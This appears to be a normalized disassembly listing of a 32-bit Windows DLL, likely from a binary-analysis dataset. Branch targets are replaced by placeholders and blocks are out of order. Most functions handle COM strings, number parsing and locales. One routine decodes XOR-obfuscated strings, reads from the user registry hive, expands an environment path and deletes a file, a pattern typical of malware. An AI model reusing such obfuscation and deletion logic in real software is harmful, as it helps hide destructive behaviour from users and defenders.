call [ SysAllocString@IAT ]
mov [ ebp - 0xb8 ] eax
call sub_1002f620
mov edx [ ebp - 0xb8 ]
push edx
call [ SysFreeString@IAT ]
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0xb0 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb0 ] 0x0
call ebx
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x98
call sub_1002f620
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x30 ]
mov eax 0x10c
call sub_1002f620
mov ebx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x3c ]
mov eax 0xf8
call sub_1002f620
mov esi [ edi + 0x4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xbc
call sub_1002f620
mov eax [ edi + 0x8 ]
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xb4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x8e
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x9e
call sub_1002f620
mov esi [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x1c ]
mov eax 0xa9
call sub_1002f620
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x12f
call sub_1002f620
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xc0 ]
push ecx
mov ecx [ ebp - 0xbc ]
push ecx
push eax
call edx
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x35
jmp r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xbd
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xac ]
test eax eax
je r-xdata
sub_1001b8e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b920
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_100727f0
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_10034100
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001b9b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov edi [ ebx ]
cmp edi [ eax ]
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebx ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
pop esi
inc eax
mov [ esi + 0x4 ] eax
sub_1001ba48
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001baa0
push ebp
mov ebp esp
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x208
lea eax [ ebp - 0x2ac ]
push 0x0
push eax
call sub_1007f8f0
mov ecx [ r--data ]
add esp 0xc
xor esi esi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff4
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0x3d
jb r-xdata
lea ecx [ ebp - 0xa4 ]
push ecx
xor eax eax
push 0x80000001
mov [ ebp - 0x2a ] ax
call sub_1005c1d0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
nop
mov esi 0x1
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7e
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x104
lea ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x28 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x2ac ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
mov eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax esi
sub_1001bb80
push ebp
mov ebp esp
push 0xffffffff
push sub_10087c75
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] bl
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x54 ] ecx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov edx 0x7
xor ecx ecx
mov [ edi + 0x40 ] edx
mov [ edi + 0x3c ] ebx
mov [ edi + 0x2c ] cx
mov [ edi + 0x5c ] edx
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] cx
mov [ edi + 0x78 ] edx
mov [ edi + 0x74 ] ebx
mov [ edi + 0x64 ] cx
lea ecx [ edi + 0x80 ]
mov [ ebp - 0x4 ] 0x3
push 0xffffffff
mov [ ecx + 0x14 ] edx
push ebx
xor edx edx
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1002d970
mov [ edi + 0xb4 ] 0xf
mov [ edi + 0xb0 ] ebx
mov [ edi + 0xa0 ] bl
mov [ edi + 0xbc ] ebx
mov [ edi + 0xc0 ] 0x3
mov [ edi + 0xc4 ] ebx
mov [ edi + 0xc8 ] ebx
mov [ edi + 0xcc ] ebx
mov [ ebp - 0x4 ] 0x6
push 0x18
mov [ edi + 0xdc ] ebx
call sub_1002e3ac
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x58 ] ebx
call sub_10032538
push r--data
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6c ] r--data
call sub_10055e2a
int3
mov [ edi + 0xd8 ] eax
mov [ eax ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ edi + 0xd8 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x7
fldz
fst [ edi + 0xf8 ]
mov [ edi + 0xe8 ] ebx
fstp [ edi + 0xfc ]
mov [ edi + 0xec ] 0x1
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ ebp - 0x50 ] ebx
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x4c ]
lea esi [ ebp - 0x50 ]
call sub_10072810
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x4c ]
push eax
xor edx edx
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
call sub_10034100
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x48 ]
call sub_1001e650
add esp 0x4
push eax
lea ecx [ edi + 0xa0 ]
mov [ ebp - 0x4 ] 0x9
call sub_1003acf0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
lea eax [ edi + 0xe4 ]
push eax
call sub_10026420
add esp 0x4
lea ecx [ edi + 0x14 ]
push ecx
call [ InitializeCriticalSection@IAT ]
mov edx [ ebp - 0x5c ]
cmp edx ebx
je r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
push ebx
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ edi + 0xf4 ] eax
cmp eax ebx
jne r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
lea ecx [ ecx ]
cmp [ ebp - 0x18 ] 0x8
mov [ edi ] 0x1
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x2c ]
call sub_10034100
mov edx [ ebp - 0x60 ]
cmp edx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
call sub_1000a86e
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x48 ]
call sub_10034100
mov edx [ ebp - 0x54 ]
cmp edx ebx
je r-xdata
lea eax [ edi + 0x64 ]
push eax
call sub_10019010
sub_1001be36
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_10030ff0
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_1002839c
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_10030ff0
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_1000c882
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_1002839c
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_10030ff0
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000eff4
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1001c00a
push 0x6c
mov eax sub_1008524c
call sub_10047689
mov eax [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10067ab7
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x6c ] ebx
call sub_1002be90
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10026407
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x51 ] 0x0
call sub_1006995b
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
mov edi [ ebp - 0x58 ]
and [ ebp - 0x60 ] 0x0
and [ ebp - 0x64 ] 0x0
mov [ eax ] 0x7830
add eax 0x2
push edi
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] 0x0
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
push edi
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005f5ef
push edi
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
inc edi
mov ecx esi
mov [ ebp - 0x50 ] edi
call sub_1005f5ef
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] al
jne r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_1001f91c
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_100430aa
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_1001f91c
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov [ ebp - 0x59 ] al
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
mov ecx esi
call sub_1005f5ef
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
xor ebx ebx
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
push 0x41
push 0x61
mov [ ebp - 0x78 ] al
push 0x30
push [ ebp - 0x78 ]
push [ ebp + 0x8 ]
call sub_100430aa
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
push [ ebp - 0x58 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005f5ef
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x64 ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
dec [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_100430aa
add esp 0x14
test eax eax
js r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x59 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
jge r-xdata
mov edi [ ebp - 0x74 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
mov al [ eax + r--data ]
mov [ edi ] al
inc edi
inc [ ebp - 0x60 ]
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x64 ]
mov [ edi ] 0x0
push 0x0
mov [ eax ] ecx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
xor eax eax
call sub_100262c3
retn
cmp [ esi + 0x5 ] 0x70
je r-xdata
mov ecx esi
call sub_1001f91c
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x59 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov [ edi ] 0x70
mov ecx esi
inc edi
call sub_1005f5ef
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x50
jne r-xdata
mov ecx esi
call sub_1001f91c
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] bl
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
push [ ebp - 0x58 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
inc edi
call sub_1005f5ef
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
inc edi
inc ebx
mov ecx esi
call sub_1001f91c
sub_1001c5d7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002d269
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_10082fcc
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_1008302e
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_1007fa40
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_10083123
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_1008351d
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
